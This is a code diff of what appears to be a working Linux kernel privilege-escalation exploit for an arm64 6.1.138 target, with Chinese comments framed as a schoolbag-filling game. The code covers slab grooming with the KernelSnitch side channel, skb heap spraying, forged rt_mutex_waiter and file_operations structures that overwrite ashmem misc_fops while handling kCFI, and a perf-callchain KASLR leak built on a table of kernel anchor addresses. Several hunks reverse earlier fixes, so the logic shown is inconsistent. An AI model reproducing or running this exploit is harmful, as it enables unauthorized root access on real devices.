@@ -1,3 +1,19 @@
+/* ==========================================================================
+ * 【魔法书包工坊】—— 把一个我们能控制内容的"书包"(内核页)造出来
+ * ==========================================================================
+ * 后面每一关都要往书包里塞假道具：
+ *   第 1 关: 假排班表(伪造 rt_mutex_waiter 图，页内自包含)
+ *   第 2 关: 假钥匙牌(伪造 file_operations 表)
+ *   第 3 关: 假水管(伪造 pipe_buffer)
+ *
+ * 造书包的原理(占座大法)：
+ *   1. 开一堆小朋友进程(clone)，每人占一个 mm_struct 座位(slab 对象)
+ *   2. KernelSnitch 侧信道数座位，把"哪几个座位连号"摸清楚
+ *   3. 让目标座位的小朋友退园(kill)，座位空出来
+ *   4. 赶紧用内核网络包(skb, 32KB order-3)把书包内容喷进刚空出的座位
+ *      —— 书包(页)从此归我们写字！
+ * ========================================================================== */
+
 #include "common.h"
 #include "kernelsnitch/kernelsnitch.h"
 #include <linux/perf_event.h>
@@ -266,23 +282,11 @@ int has_zero_byte(uintptr_t value) {
 uintptr_t p0_data_alias(uintptr_t image_addr) {
   uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
   uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
-  /* Linear-map alias of the symbol's TRUE physical page. The old
-   * `(phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET` assumed the kernel image is
-   * loaded at P0_PHYS_OFFSET (0x80000000); on shennong it is loaded at
-   * P0_KERNEL_PHYS_LOAD (0xa8000000), so that formula landed 128MB below
-   * the real page and the W1 write (via data_addr) never reached the page
-   * the kernel reads via its canonical VA -> step=4 on every attempt. */
-  return P0_PAGE_OFFSET + phys;
+  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
 }
 
 uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
-  /* 必须是 p0_data_alias 的严格逆运算:
-   *   data_alias = P0_PAGE_OFFSET + (P0_KERNEL_PHYS_LOAD + (image - KIMAGE_TEXT_BASE))
-   *   => image = KIMAGE_TEXT_BASE + (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_LOAD
-   * 旧写法用 P0_KERNEL_PHYS_DELTA (= PHYS_LOAD - PHYS_OFFSET = 0x28000000) 会少
-   * 减 P0_PHYS_OFFSET(0x80000000), 逆算出的 image 偏移错 128MB, 经此路径的
-   * slide_canon_addr 还原地址也会错位。 */
-  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_LOAD;
+  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
 }
 
 uintptr_t data_addr(uintptr_t image_addr) {
@@ -318,12 +322,8 @@ void put32(unsigned char *p, size_t off, uint32_t value) {
 
 void put_fake_fops_table(unsigned char *p, size_t off) {
   put64(p, off + FOPS_OWNER_OFF, 0);
-  /* CFI 防伪: llseek 槽必须指向真实内核函数,其入口前 4 字节自带正确的
-   * kCFI 类型哈希(#e61887de)。原先填 fake_w0+FAKE_WAITER_PI_TREE_ENTRY_OFF
-   * (喷页假地址),前 4 字节是垃圾 -> 内核走 f_op->llseek 时 kCFI 比对失败
-   * 直接 panic,卡在第 2 关。改成真实 noop_llseek 后,假钥匙牌与该槽
-   * 标记同构;后续 repair_fake_fops_llseek 写回同一值,语义不变。 */
-  put64(p, off + FOPS_LLSEEK_OFF, text_addr(NOOP_LLSEEK));
+  put64(p, off + FOPS_LLSEEK_OFF,
+        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
   put64(p, off + FOPS_READ_OFF, 0);
   put64(p, off + FOPS_WRITE_OFF, 0);
   put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
@@ -479,6 +479,11 @@ void prepare_ctxs(void) {
   post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
 }
 
+/* 【往书包里装道具】按 payload_mode 装不同关卡的道具：
+ *   PAGE_PAYLOAD_SLIDE(第 1 关): 假排班表 —— 伪造 rt_mutex_waiter 全家桶
+ *   PAGE_PAYLOAD_FOPS (第 2 关): 假钥匙牌 —— 伪造 file_operations 表
+ * 书包是 32KB 大块，同一份道具在每 8KB(chunk)重复印一遍，
+ * 提高喷中率(不确定学校会发哪个 chunk)。 */
 int prepare_skb_payload(uintptr_t base, int payload_mode) {
   memset(skb_buf, 0, SKB_SEND_SIZE);
 
@@ -488,109 +493,91 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   fake_w0 = payload_base + W0_OFF;
   fake_task = payload_base + FAKE_TASK_OFF;
   fake_fops = payload_base + FOPS_TABLE_OFF;
-  int deep_walk = (payload_mode == PAGE_PAYLOAD_FOPS);
-  uintptr_t write_pc = fake_fops;
+  if (payload_mode == PAGE_PAYLOAD_FOPS) {
+    binwrite_target = payload_base + SCRATCH_OFF;
+  } else {
+    binwrite_target = payload_base + FOPS_OFF + 0x700;
+  }
+
+  /* 【页内种子按模式分家】
+   * SLIDE(早退探测路线): owner=NULL 让 walk 在 "lock free" 分支提前
+   *   wake+退出 —— 零解引用, 真机验证 DEPTH0 就是靠它活着。
+   * FOPS(W1 写路线): 必须 owner=fake_task|1 —— owner==NULL 会让
+   *   rt_mutex_adjust_prio_chain 走 "lock is free" 早退分支, rb_erase
+   *   永远不执行, W1 写不到 misc_fops(真机 23 次全 step=4 的根因)。
+   *   深入所需种子对齐 Poc-Analysis 真机验证版: fake_task.pi_waiters
+   *   空树、task_group=0、页内 w0.pi_tree_entry 也带 W1 语义。 */
+  uintptr_t fake_right_zone = payload_base + RIGHT_OFF;
+  uintptr_t fake_left_zone = payload_base + LEFT_OFF;
+  uintptr_t write_pc = fake_right_zone;
   uintptr_t write_right = 0;
   uintptr_t write_left = 0;
-  uint64_t waiter_task = text_addr(INIT_TASK);
-  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
-  uint64_t pi_top_task = text_addr(INIT_TASK);
+  uint64_t waiter_task = fake_task;
+  uint64_t task_group = fake_task;
+  uint64_t pi_top_task = fake_task;
+  int deep_walk = payload_mode == PAGE_PAYLOAD_FOPS;
   if (deep_walk) {
-    /* 第 2 关 FOPS(W1 写路线): 严格对齐已验证上游(Poc-Analysis 真机验证)。
-     * p0_data_alias 修正后 data_addr 与 canon_addr 已指向同一物理页, 故
-     * W1 写目标统一用 data_addr(ASHMEM_MISC_FOPS), 与 try_cfi_stage 的读
-     * 同族, 不再有"写经 data_addr、读经 canon_addr"的错位。
-     * waiter_task / task_group / pi_top_task 必须用真实内核对象
-     * (INIT_TASK / ROOT_TASK_GROUP): 之前误用页内 fake_task, 会让
-     * rt_mutex_setprio 走 __task_rq_lock(fake_task) 直接 panic, 或使 PI
-     * 链 walk 不进入 dequeue/W1, 假 fops 指针写不进 misc_fops -> step=4。 */
-    fake_parent = fake_fops;
-    fake_right = data_addr(ASHMEM_MISC_FOPS);
-    fake_left = 0;
-    binwrite_target = payload_base + SCRATCH_OFF;
     write_pc = fake_fops;
-    write_right = data_addr(ASHMEM_MISC_FOPS);
-    write_left = 0;
-    waiter_task = text_addr(INIT_TASK);
-    task_group = text_addr(ROOT_TASK_GROUP);
-    pi_top_task = text_addr(INIT_TASK);
-  } else {
-    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
-    fake_right = fake_fops;
-    fake_left = payload_base + LEFT_OFF;
-    binwrite_target = payload_base + FOPS_OFF + 0x700;
-    write_pc = fake_fops;
-    write_right = data_addr(ASHMEM_MISC_FOPS);
-    write_left = 0;
-    waiter_task = text_addr(INIT_TASK);
-    task_group = text_addr(ROOT_TASK_GROUP);
-    pi_top_task = text_addr(INIT_TASK);
+    write_left = canon_addr(ASHMEM_MISC_FOPS);
+    task_group = 0;
   }
-  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    write_pc = SLIDE_LOGGERS_0_1;
-    write_right = 0;
-    write_left = SLIDE_RANDOM_BOOT_ID_DATA;
-    waiter_task = SLIDE_INIT_TASK;
-    task_group = SLIDE_ROOT_TASK_GROUP;
-    pi_top_task = SLIDE_INIT_TASK;
-  }
+  fake_parent = fake_right_zone;
+  fake_right = fake_left_zone;
+  fake_left = fake_left_zone;
 
   for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
     unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
 
+    /* 【假锁的排队名单】waiters 红黑树指到书包里的 fake_w0。园长查
+     * "谁在排队"时(leftmost->task)，第一个读的就是这里 —— 必须落在
+     * 书包内，否则空指针警报(反汇编已验证无 NULL 检查)。
+     * owner: SLIDE=NULL(walk 早退零解引用); FOPS=fake_task|1 ——
+     * owner==NULL 走 "lock is free" 分支直接 wake 退出, rb_erase/W1
+     * 不执行(真机 step=4 根因); owner 非 NULL 且 != walk task 才会
+     * 继续 dequeue/enqueue 链。fake_task 全部 seeds 页内自包含
+     * (pi_blocked_on=0 终止链, __state=0 早退 wake, usage=0x100),
+     * 深入不会出页。 */
     put32(p, LOCK_OFF + 0x00, 0);
-    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-      /* slide 路径: owner=0, walk 走"lock is free"分支。
-       * slide 的 W1 写通过另一条路径触发(tree_entry 侧), 与 owner 无关。 */
-      put64(p, LOCK_OFF + 0x08, 0);
-      put64(p, LOCK_OFF + 0x10, 0);
-      put64(p, LOCK_OFF + 0x18, 0);
-    } else {
-      /* FOPS 路径: owner 必须非空且指向一个合法 task, 否则 PI 链 walk
-       * 走 "lock has no owner" 快速退出, rb_erase 永不执行,
-       * W1 写不触发 -> 全 24 次 step=4 且无 panic。
-       * owner = fake_task | 1 (bit0=1 表示 RT-mutex 持有),
-       * 配合 fake_task->pi_waiters 指向 fake_w0->pi_tree_entry,
-       * walk 走到 dequeue 分支时调用 rb_erase(pi_tree_entry),
-       * 触发 W1 写把 fake_fops 写入 misc_fops 槽。 */
-      put64(p, LOCK_OFF + 0x08, fake_task | 1);
-      put64(p, LOCK_OFF + 0x10, 0);
-      put64(p, LOCK_OFF + 0x18, 0);
-    }
+    put64(p, LOCK_OFF + 0x08, fake_w0);
+    put64(p, LOCK_OFF + 0x10, fake_w0);
+    put64(p, LOCK_OFF + 0x18, deep_walk ? (fake_task | 1) : 0);
 
-    /* 6.1 legacy rt_mutex_waiter layout (BTF verified on shennong 6.1.138):
-     *   0x00 tree_entry (rb_node: pc/right/left)
-     *   0x18 pi_tree_entry (rb_node: pc/right/left)
-     *   0x30 task (ptr)
-     *   0x38 lock (ptr)
-     *   0x40 wake_state (u32)  0x44 prio (int)
-     *   0x48 deadline (u64)    0x50 ww_ctx (ptr)
-     * The 6.4+ FAKE_WAITER_* macros (0x28/0x50/0x58...) are WRONG for 6.1. */
-    put64(p, W0_OFF + 0x00, 1);                  /* tree_entry.pc */
-    put64(p, W0_OFF + 0x08, 0);                  /* tree_entry.right */
-    put64(p, W0_OFF + 0x10, 0);                  /* tree_entry.left */
-    put64(p, W0_OFF + 0x18, write_pc);           /* pi_tree_entry.pc */
-    put64(p, W0_OFF + 0x20, write_right);        /* pi_tree_entry.right */
-    put64(p, W0_OFF + 0x28, write_left);         /* pi_tree_entry.left */
-    put64(p, W0_OFF + 0x30, waiter_task);        /* task */
-    put64(p, W0_OFF + 0x38, fake_lock);          /* lock */
-    put32(p, W0_OFF + 0x40, 0);                  /* wake_state */
-    put32(p, W0_OFF + 0x44, FAKE_WAITER_PRIO);   /* prio */
-    put64(p, W0_OFF + 0x48, 0);                  /* deadline */
-    put64(p, W0_OFF + 0x50, 0);                  /* ww_ctx */
+    /* 【假标签树根必须染黑】parent_color=0 表示"无父 + 黑色"。
+     * 树根若是红色：园长把红色鬼标签补挂到它下面时会触发"红红冲突"，
+     * 要找祖父节点核对 —— 树根没有祖父(空指针) -> 全园警报。
+     * 树根染黑后，红色子标签怎么挂都合法，绝不触发旋转。 */
+    put64(p, W0_OFF + 0x00, 0);
+    put64(p, W0_OFF + 0x08, 0);
+    put64(p, W0_OFF + 0x10, 0);
+    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
+    put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
+    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
+    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
+    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
+    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
+    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
+    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
+    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
+    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
+    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
 
     put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
-    /* 第 2 关 FOPS 路径: owner = fake_task|1, waiter 必须在 owner 的
-     * pi_waiters 树中, 否则 PI 链 walk 走到 owner 时找不到 waiter,
-     * rb_erase(pi_tree_entry) 永不执行 -> W1 写不触发 -> step=4。
-     * 与 slide 路径一致: pi_waiters 指向 fake_w0+0x18 (6.1 pi_tree_entry)。 */
-    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
-          fake_w0 + 0x18);
-    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
-          fake_w0 + 0x18);
+    if (deep_walk) {
+      /* FOPS: pi_waiters 空树(Poc 真机验证版) —— dequeue_pi 的
+       * rb_erase_cached 在空树上只操作鬼标签自身字段(树根写 NULL,
+       * 页外零写), enqueue_pi 成根零旋转; 非空树反而会被 walk 深入
+       * 逐节点核对。 */
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
+    } else {
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
+            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
+            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+    }
     put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
     put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
     put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
@@ -610,6 +597,8 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   return 1;
 }
 
+/* 【造书包主流程】占座 -> 数座位 -> 腾座位 -> 喷书包。
+ * 任何一步失败(座位没数清/没喷中)都返回 0，调用方换一轮重来。 */
 uintptr_t prepare_kernel_page(int payload_mode) {
   close_reclaim_sockets();
   mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
@@ -707,7 +696,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   struct iovec iov;
   memset(&iov, 0, sizeof(iov));
   iov.iov_base = skb_buf;
-  iov.iov_len = SKB_RECLAIM_SIZE; /* 0x8e80: matches SKB_DATA_DELTA=-0xe80 layout; SKB_SEND_SIZE(0x10000) misplaces fake_lock */
+  iov.iov_len = SKB_RECLAIM_SIZE; /* 0x8e78: matches SKB_DATA_DELTA=-0xe78 layout; SKB_SEND_SIZE(0x10000) misplaces fake_lock */
 
   struct msghdr msg;
   memset(&msg, 0, sizeof(msg));
@@ -844,8 +833,125 @@ ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
   return configfs_read_once(fd, target, data, len);
 }
 
-#define PERF_LEAK_ALIGN 0x200000ULL
-#define PERF_LEAK_MMAP_PAGES 8
+/* --------------------------------------------------------------------------
+ * KASLR 泄漏(perf 路线):perf_event_paranoid == -1 时可用。
+ *
+ * 原理:给自己挂一个 software cpu-clock 事件(exclude_user=1),再疯狂跑
+ * getpid()。定时器只在内核态打断我们 → 每个样本的 callchain 必然是
+ * [IP] + invoke_syscall 返回点 + el0_svc_common 返回点 + do_el0_svc 返回点
+ * + el0_svc 返回点(全部来自本内核镜像的静态反汇编,锚点表见下)。
+ * 帧值 = 镜像基址 + slide + 锚点RVA(精确相等,不是近似),所以每次命中
+ * 都直接解出 slide。帧本身也都是别的函数的返回点,不可能与锚点地址
+ * 巧合相等 → 伪阳性为零;仍要求 >=2 个不同锚点同时命中以双保险。
+ * -------------------------------------------------------------------------- */
+
+struct perf_anchor {
+  uint64_t rva;
+  const char *func;
+};
+
+/* shennong 6.1.138 镜像中以下函数的全部 BL/BLR 返回点
+ * (gen_anchors.py 用 llvm-objdump 从 kernel.elf 提取) */
+static const struct perf_anchor perf_anchors[] = {
+  {0x010034ULL, "gic_handle_irq"},
+  {0x010060ULL, "gic_handle_irq"},
+  {0x01006cULL, "gic_handle_irq"},
+  {0x010074ULL, "gic_handle_irq"},
+  {0x010094ULL, "gic_handle_irq"},
+  {0x010144ULL, "gic_handle_irq"},
+  {0x010194ULL, "gic_handle_irq"},
+  {0x02cfc0ULL, "do_el0_svc"},
+  {0x02d08cULL, "el0_svc_common"},
+  {0x02d0a4ULL, "el0_svc_common"},
+  {0x02d0d0ULL, "el0_svc_common"},
+  {0x02d0f8ULL, "el0_svc_common"},
+  {0x02d190ULL, "invoke_syscall"},
+  {0x02d1d8ULL, "invoke_syscall"},
+  {0x02d1e4ULL, "invoke_syscall"},
+  {0x02d228ULL, "invoke_syscall"},
+  {0x1869f4ULL, "hrtimer_interrupt"},
+  {0x186a1cULL, "hrtimer_interrupt"},
+  {0x186a6cULL, "hrtimer_interrupt"},
+  {0x186a80ULL, "hrtimer_interrupt"},
+  {0x186a88ULL, "hrtimer_interrupt"},
+  {0x186aa8ULL, "hrtimer_interrupt"},
+  {0x186ab4ULL, "hrtimer_interrupt"},
+  {0x186ac0ULL, "hrtimer_interrupt"},
+  {0x186ad8ULL, "hrtimer_interrupt"},
+  {0x186b38ULL, "hrtimer_interrupt"},
+  {0x186b4cULL, "hrtimer_interrupt"},
+  {0x186b54ULL, "hrtimer_interrupt"},
+  {0x186b74ULL, "hrtimer_interrupt"},
+  {0x186b80ULL, "hrtimer_interrupt"},
+  {0x186b8cULL, "hrtimer_interrupt"},
+  {0x186ba4ULL, "hrtimer_interrupt"},
+  {0x186c04ULL, "hrtimer_interrupt"},
+  {0x186c18ULL, "hrtimer_interrupt"},
+  {0x186c20ULL, "hrtimer_interrupt"},
+  {0x186c40ULL, "hrtimer_interrupt"},
+  {0x186c4cULL, "hrtimer_interrupt"},
+  {0x186c58ULL, "hrtimer_interrupt"},
+  {0x186c70ULL, "hrtimer_interrupt"},
+  {0x186cbcULL, "hrtimer_interrupt"},
+  {0x186cf0ULL, "hrtimer_interrupt"},
+  {0x186d10ULL, "hrtimer_interrupt"},
+  {0x186e38ULL, "__hrtimer_run_queues"},
+  {0x186e68ULL, "__hrtimer_run_queues"},
+  {0x186e8cULL, "__hrtimer_run_queues"},
+  {0x186e9cULL, "__hrtimer_run_queues"},
+  {0x186eb8ULL, "__hrtimer_run_queues"},
+  {0x186f40ULL, "__hrtimer_run_queues"},
+  {0x186f60ULL, "__hrtimer_run_queues"},
+  {0x186fb0ULL, "__hrtimer_run_queues"},
+  {0x186fd4ULL, "__hrtimer_run_queues"},
+  {0x187020ULL, "__hrtimer_run_queues"},
+  {0x187044ULL, "__hrtimer_run_queues"},
+  {0x187084ULL, "__hrtimer_run_queues"},
+  {0xff6190ULL, "el0_svc"},
+  {0xff6198ULL, "el0_svc"},
+  {0xff61b8ULL, "el0_svc"},
+  {0xff61d0ULL, "el0_svc"},
+};
+
+#define PERF_ANCHOR_COUNT (int)(sizeof(perf_anchors) / sizeof(perf_anchors[0]))
+#define PERF_LEAK_RING_PAGES 32
+#define PERF_LEAK_SLIDE_ALIGN 0x200000ULL
+#define PERF_LEAK_SLIDE_MAX 0x400000000ULL
+#define PERF_LEAK_STORM_ITER 200000
+#define PERF_LEAK_MAX_CHAIN 128
+#define PERF_LEAK_MAX_VOTES 16
+
+struct perf_slide_vote {
+  uint64_t slide;
+  int votes;
+  uint64_t anchor_mask;
+};
+
+static void perf_vote_slide(struct perf_slide_vote *votes, int max_votes,
+                            uint64_t slide, int anchor_idx) {
+  for (int i = 0; i < max_votes; i++) {
+    if (votes[i].votes == 0) {
+      votes[i].slide = slide;
+      votes[i].votes = 1;
+      votes[i].anchor_mask = 1ULL << anchor_idx;
+      return;
+    }
+    if (votes[i].slide == slide) {
+      votes[i].votes++;
+      votes[i].anchor_mask |= 1ULL << anchor_idx;
+      return;
+    }
+  }
+}
+
+static int perf_popcount64(uint64_t v) {
+  int n = 0;
+  while (v) {
+    v &= v - 1;
+    n++;
+  }
+  return n;
+}
 
 uint64_t perf_leak_text_base(void) {
   int pfd = open("/proc/sys/kernel/perf_event_paranoid", O_RDONLY | O_CLOEXEC);
@@ -867,8 +973,8 @@ uint64_t perf_leak_text_base(void) {
   pe.type = PERF_TYPE_SOFTWARE;
   pe.config = PERF_COUNT_SW_CPU_CLOCK;
   pe.size = sizeof(pe);
-  pe.sample_period = 1;
-  pe.sample_type = PERF_SAMPLE_IP;
+  pe.sample_period = 20000;
+  pe.sample_type = PERF_SAMPLE_CALLCHAIN;
   pe.exclude_user = 1;
   pe.exclude_hv = 1;
   pe.disabled = 1;
@@ -880,11 +986,16 @@ uint64_t perf_leak_text_base(void) {
     fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
   }
   if (fd < 0) {
+    pe.sample_period = 1000000;
+    fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
+  }
+  if (fd < 0) {
     pr_warning("perf text-base perf_event_open errno=%d\n", errno);
     return 0;
   }
 
-  size_t mmap_size = (size_t)(1 + PERF_LEAK_MMAP_PAGES) * (size_t)PAGE_SIZE;
+  size_t mmap_size =
+      (size_t)(1 + PERF_LEAK_RING_PAGES) * (size_t)PAGE_SIZE;
   void *mmap_buf = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE,
                          MAP_SHARED, fd, 0);
   if (mmap_buf == MAP_FAILED) {
@@ -895,65 +1006,113 @@ uint64_t perf_leak_text_base(void) {
 
   struct perf_event_mmap_page *header =
       (struct perf_event_mmap_page *)mmap_buf;
-  uint64_t min_kip = ~(uint64_t)0;
-  int kernel_samples = 0;
 
   ioctl(fd, PERF_EVENT_IOC_RESET, 0);
   ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
 
-  for (volatile long i = 0; i < 500000; i++) {
-    if ((i % 10000) == 0) {
-      sched_yield();
-    }
+  /* 定时器只在内核态打断我们(exclude_user=1) → 命中的必然是
+   * getpid 系统调用路径,callchain 全是锚点函数的返回点 */
+  for (volatile long i = 0; i < PERF_LEAK_STORM_ITER; i++) {
+    syscall(__NR_getpid);
   }
 
   ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
 
-  uint64_t data_tail = header->data_tail;
-  uint64_t data_head = header->data_head;
+  uint64_t head = header->data_head;
   __sync_synchronize();
-  uint64_t data_size = (uint64_t)PERF_LEAK_MMAP_PAGES * (uint64_t)PAGE_SIZE;
-  uint8_t *base = (uint8_t *)mmap_buf + PAGE_SIZE;
-
-  while (data_tail < data_head) {
-    struct perf_event_header *ev =
-        (struct perf_event_header *)(base + (data_tail % data_size));
-    if (ev->size == 0) {
-      break;
-    }
-    if (data_tail + ev->size > data_head) {
-      break;
-    }
-    if (ev->type == PERF_RECORD_SAMPLE &&
-        (ev->misc & PERF_RECORD_MISC_KERNEL)) {
-      uint64_t ip = *(uint64_t *)((uint8_t *)ev + sizeof(*ev));
-      if (ip >= KIMAGE_TEXT_BASE && ip < min_kip) {
-        min_kip = ip;
-      }
-      kernel_samples++;
-    }
-    data_tail += ev->size;
+  uint64_t size = (uint64_t)PERF_LEAK_RING_PAGES * (uint64_t)PAGE_SIZE;
+  uint64_t tail = header->data_tail;
+  if (head > tail + size) {
+    /* 环形缓冲回绕:只保留最后一个窗口 */
+    tail = head - size;
   }
-  header->data_tail = data_tail;
+  uint8_t *data = (uint8_t *)mmap_buf + PAGE_SIZE;
+
+  struct perf_slide_vote votes[PERF_LEAK_MAX_VOTES];
+  memset(votes, 0, sizeof(votes));
+  int samples = 0;
+  int kernel_samples = 0;
+  int frames = 0;
+  int max_chain = 0;
+  int zero_slide_hits = 0;
+
+  while (tail + 8 <= head) {
+    struct perf_event_header *ev =
+        (struct perf_event_header *)(data + (tail % size));
+    uint16_t esz = ev->size;
+    if (esz < 8 || (esz & 7) || tail + esz > head) {
+      break;
+    }
+    if (ev->type == PERF_RECORD_SAMPLE) {
+      samples++;
+      if (ev->misc & PERF_RECORD_MISC_KERNEL) {
+        kernel_samples++;
+      }
+      /* sample_type = CALLCHAIN only: header + u64 nr + nr*u64 ips */
+      const uint64_t *body = (const uint64_t *)((uint8_t *)ev + sizeof(*ev));
+      uint64_t nr = body[0];
+      if (nr > 0 && nr <= PERF_LEAK_MAX_CHAIN) {
+        if ((int)nr > max_chain) {
+          max_chain = (int)nr;
+        }
+        for (uint64_t k = 0; k < nr; k++) {
+          uint64_t ip = body[1 + k];
+          frames++;
+          for (int a = 0; a < PERF_ANCHOR_COUNT; a++) {
+            uint64_t slide =
+                ip - KIMAGE_TEXT_BASE - perf_anchors[a].rva;
+            if (slide == 0) {
+              zero_slide_hits++;
+              continue;
+            }
+            if (slide >= PERF_LEAK_SLIDE_MAX ||
+                (slide & (PERF_LEAK_SLIDE_ALIGN - 1)) != 0) {
+              continue;
+            }
+            perf_vote_slide(votes, PERF_LEAK_MAX_VOTES, slide, a);
+          }
+        }
+      }
+    }
+    tail += esz;
+  }
+  header->data_tail = tail;
 
   munmap(mmap_buf, mmap_size);
   close(fd);
 
-  if (kernel_samples == 0 || min_kip == ~(uint64_t)0) {
-    pr_warning("perf text-base no kernel samples collected\n");
+  if (samples == 0) {
+    pr_warning("perf text-base no samples (max_chain=%d)\n", max_chain);
     return 0;
   }
 
-  uint64_t text_base =
-      (min_kip & ~(PERF_LEAK_ALIGN - 1)) + P0_KERNEL_PHYS_DELTA;
-  if (text_base < KIMAGE_TEXT_BASE) {
-    pr_warning("perf text-base out of range: %016llx\n",
-               (unsigned long long)text_base);
+  int best = -1;
+  for (int i = 0; i < PERF_LEAK_MAX_VOTES; i++) {
+    if (votes[i].votes == 0) {
+      continue;
+    }
+    pr_info("perf slide-candidate slide=%016llx votes=%d anchors=%d\n",
+            (unsigned long long)votes[i].slide, votes[i].votes,
+            perf_popcount64(votes[i].anchor_mask));
+    if (best < 0 || votes[i].votes > votes[best].votes) {
+      best = i;
+    }
+  }
+
+  if (best < 0 || votes[best].votes < 3 ||
+      perf_popcount64(votes[best].anchor_mask) < 2) {
+    pr_warning("perf text-base no reliable slide: samples=%d "
+               "kernel=%d frames=%d max_chain=%d zero_slide_hits=%d\n",
+               samples, kernel_samples, frames, max_chain, zero_slide_hits);
     return 0;
   }
-  pr_success("perf text-base pid=%d samples=%d min_kip=%016llx "
-             "text_base=%016llx\n",
-             getpid(), kernel_samples, (unsigned long long)min_kip,
+
+  uint64_t text_base = KIMAGE_TEXT_BASE + votes[best].slide;
+  pr_success("perf text-base pid=%d samples=%d kernel=%d frames=%d "
+             "max_chain=%d slide=%016llx votes=%d anchors=%d base=%016llx\n",
+             getpid(), samples, kernel_samples, frames, max_chain,
+             (unsigned long long)votes[best].slide, votes[best].votes,
+             perf_popcount64(votes[best].anchor_mask),
              (unsigned long long)text_base);
   return text_base;
 }
